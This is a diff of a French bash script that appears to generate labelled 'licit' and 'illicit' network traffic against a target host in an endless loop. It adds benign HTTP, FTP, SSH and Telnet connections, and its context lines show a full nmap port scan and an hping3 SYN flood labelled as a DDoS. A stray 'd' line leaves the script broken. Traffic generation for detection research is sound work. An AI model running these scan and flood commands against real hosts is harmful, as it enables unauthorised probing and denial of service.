@@ -23,6 +23,31 @@ MAC_ADDRESS=$(arp -a | awk '{print $4}' | grep -v "incomplete" | shuf -n 1)
 echo "Adresse MAC aléatoire : $MAC_ADDRESS"
 
 while true; do
+	echo "==== DEBUT DES CONNEXIONS LICITES ===="
+
+	# Connexion HTTP
+    echo "Connexion HTTP..."
+    curl -I "http://$TARGET"
+
+    # Connexion FTP
+    echo "Connexion FTP..."
+    ftp -inv "$TARGET" <<EOF
+user anonymous anonymous
+bye
+EOF
+
+    # Connexion SSH
+    echo "Connexion SSH..."
+    ssh -o BatchMode=yes -o ConnectTimeout=5 "$TARGET" exit
+
+    # Connexion Telnet
+    echo "Connexion Telnet..."
+    (echo open "$TARGET"; sleep 1; echo quit) | telnet
+
+    echo "Boucle terminée, recommence..."
+d
+    echo "=== Début des connexions illicites ==="
+
     # 1. Balayage des ports TCP (1 à 65535)
     echo "1. Balayage des ports TCP (1 à 65535)..."
     timeout 30s nmap -p- -T5 -sV -Pn "$TARGET"
@@ -76,6 +101,27 @@ while true; do
     # 14. Relâcher un DDOS via un SYN Flood (avec hping3)
     echo "14. Relâcher un DDOS via un SYN Flood..."
     timeout 30s hping3 --faster -S -p 80 --flood "$TARGET"
+
+	echo "==== DEBUT DES CONNEXIONS LICITES ===="
+
+	# Connexion HTTP
+    echo "Connexion HTTP..."
+    curl -I "http://$TARGET"
+
+    # Connexion FTP
+    echo "Connexion FTP..."
+    ftp -inv "$TARGET" <<EOF
+user anonymous anonymous
+bye
+EOF
+
+    # Connexion SSH
+    echo "Connexion SSH..."
+    ssh -o BatchMode=yes -o ConnectTimeout=5 "$TARGET" exit
+
+    # Connexion Telnet
+    echo "Connexion Telnet..."
+    (echo open "$TARGET"; sleep 1; echo quit) | telnet
 
     echo "Boucle terminée, recommence..."
 done
